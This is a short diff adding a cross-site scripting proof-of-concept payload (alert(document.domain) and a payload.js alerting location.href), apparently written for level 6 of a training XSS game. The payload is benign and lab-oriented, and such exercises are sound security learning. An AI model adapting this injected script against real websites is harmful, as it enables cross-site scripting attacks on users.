@@ -1,2 +1,9 @@
 # payload-googlexss
-"java script file for" +alert(document.domain);
+alert(document.domain);
+
+
+// payload.js — PoC for XSS Game level6
+(function(){
+  alert('XSS by Hima — ' + location.href);
+})();
+
